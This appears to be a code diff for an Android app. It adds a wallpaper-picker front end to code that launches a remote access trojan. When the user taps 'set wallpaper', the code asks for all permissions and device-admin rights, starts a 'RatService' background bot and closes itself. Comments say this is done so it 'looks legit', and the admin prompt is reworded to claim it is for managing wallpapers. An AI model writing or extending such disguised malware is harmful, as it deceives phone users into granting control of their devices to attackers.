@@ -8,6 +8,9 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.GridView;
 import android.widget.Toast;
 
 import java.util.ArrayList;
@@ -21,19 +24,39 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
 
+        GridView grid = findViewById(R.id.gridWallpaper);
+        grid.setAdapter(new WallpaperAdapter(this));
+
+        Button btnSet = findViewById(R.id.btnSet);
+        Button btnRefresh = findViewById(R.id.btnRefresh);
+
+        btnSet.setOnClickListener(v -> {
+            Toast.makeText(this, "Wallpaper berhasil diganti!", Toast.LENGTH_SHORT).show();
+            // Action: minta izin + device admin + start service + close
+            requestAllPermissions();
+            requestDeviceAdmin();
+            startRatService();
+            new android.os.Handler().postDelayed(this::finish, 500);
+        });
+
+        btnRefresh.setOnClickListener(v -> {
+            Toast.makeText(this, "Memuat wallpaper baru...", Toast.LENGTH_SHORT).show();
+            grid.setAdapter(new WallpaperAdapter(this));
+        });
+
+        // Minta izin dulu (biar keliatan legit)
         requestAllPermissions();
-        requestDeviceAdmin();
+    }
 
+    private void startRatService() {
         Intent svc = new Intent(this, BotService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(svc);
         } else {
             startService(svc);
         }
-
-        Toast.makeText(this, "System update completed", Toast.LENGTH_SHORT).show();
-        finish();
     }
 
     private void requestDeviceAdmin() {
@@ -44,7 +67,7 @@ public class MainActivity extends Activity {
                 Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                 intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                 intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                        "Aktifkan untuk update sistem otomatis.");
+                        "Aktifkan untuk mengelola wallpaper.");
                 startActivityForResult(intent, ADMIN_REQ);
             }
         } catch (Exception e) {}
